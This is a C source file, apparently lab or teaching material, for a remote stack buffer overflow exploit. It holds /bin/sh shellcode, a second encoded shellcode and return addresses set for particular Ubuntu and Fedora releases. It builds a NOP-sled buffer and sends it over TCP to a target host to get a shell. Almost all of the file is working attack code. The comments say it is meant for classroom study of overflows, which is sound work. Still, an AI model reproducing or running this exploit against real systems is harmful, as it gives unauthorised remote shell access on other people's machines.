/** rexploit.c
  Coded by Fanping Zeng. 10/03/2013 
  The shellcode is sent to the victim through internet. 
  We can smash a small buffer to obtain a shell. But we cannot use it.
  gcc -o rexploit ../src/rexploit.c
*/
//====================================================================

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h> 

char shellcode[]=
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
/*
 80481e0:       31 d2                   xor    %edx,%edx
 80481e2:       52                      push   %edx
 80481e3:       68 6e 2f 73 68          push   $0x68732f6e
 80481e8:       68 2f 2f 62 69          push   $0x69622f2f
 80481ed:       89 e3                   mov    %esp,%ebx
 80481ef:       52                      push   %edx
 80481f0:       53                      push   %ebx
 80481f1:       89 e1                   mov    %esp,%ecx
 80481f3:       8d 42 0b                lea    0xb(%edx),%eax
 8048419:	0f 34                	sysenter 

// 80481f6:       cd 80                   int    $0x80
*/

/* 149 bytes */
char Rshellcode[]=
"\xeb\x0e\x5a\x4a\x31\xc9\xb1\x80\x80\x34\x11\xfd\xe2\xfa\xeb\x05"
"\xe8\xed\xff\xff\xff\xcc\x3d\xad\xbd\xad\x74\x1e\xcc\x34\x4d\x5f"
"\x30\x7d\x16\xa2\xa2\xcc\x0b\xbb\x74\x0e\xcc\x2f\x97\xfe\xa4\x97"
"\xca\xa5\x30\x7d\xad\x74\x3f\x7d\x33\xf5\xbc\x97\xca\xa5\x30\x7d"
"\x74\x14\x97\xf9\xa7\x97\xfe\xa5\x30\x7d\xa7\x97\xf9\xa4\x97\xca"
"\xa5\x30\x7d\x7c\x80\xfd\xa5\x9e\xcd\x93\x88\x36\x74\x0e\xcc\x34"
"\x4c\xfe\x4d\xc2\xb4\x30\x7d\xbc\x1f\x05\xcc\x3d\x74\x06\x70\xaa"
"\xf5\xad\xaf\xae\x74\x1c\xcc\x2f\x4d\xf6\x30\x7d\xcc\x26\x74\x25"
"\xbd\x30\x7d\x15\x61\x02\x02\x02\xd2\x9f\x94\x93\xd2\x8e\x95\xfd"
"\xd0\x94\x8e\x8d\xfd";

// You should determine RETURN address through GDB overflow.
//#define RETURN 0xbfffeecc // for ubuntu14.04LTS
#define RETURN 0xbfffea20   // for ubuntu16.04LTS
//#define RETURN 0xbfffee70 // for Fedora20.0
#define SMALL_BUFF_LEN 64
#define LARGE_BUFF_LEN 1024

char Lbuffer[LARGE_BUFF_LEN];

void GetAttackBuff()
{
    unsigned long *ps;

    memset(Lbuffer, 0x90, LARGE_BUFF_LEN);
    strcpy(Lbuffer + (LARGE_BUFF_LEN - strlen(shellcode) - 10), shellcode);

    ps = (unsigned long *)(Lbuffer+76);
    *(ps) = RETURN+0x100;
    Lbuffer[LARGE_BUFF_LEN - 1] = 0;
    printf("The length of attack string is %d\n\tReturn address=0x%x\n",
        strlen(Lbuffer),(unsigned int)*(ps));
}

int main(int argc, char *argv[])
{
    int sockfd = 0, n = 0;

    struct sockaddr_in serv_addr; 

    if(argc != 3)
    {
        printf("\n Usage: %s <ip of server> <port number>\n",argv[0]);
        return 1;
    } 

    GetAttackBuff();

    if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("\n Error : Could not create socket \n");
        return 1;
    } 

    memset(&serv_addr, '0', sizeof(serv_addr)); 

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(atoi(argv[2])); 

    if(inet_pton(AF_INET, argv[1], &serv_addr.sin_addr)<=0)
    {
        printf("\n inet_pton error occured\n");
        return 1;
    } 

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
       printf("\n Error : Connect Failed \n");
       return 1;
    } 

    write(sockfd, Lbuffer, strlen(Lbuffer)); 

    return 0;

}

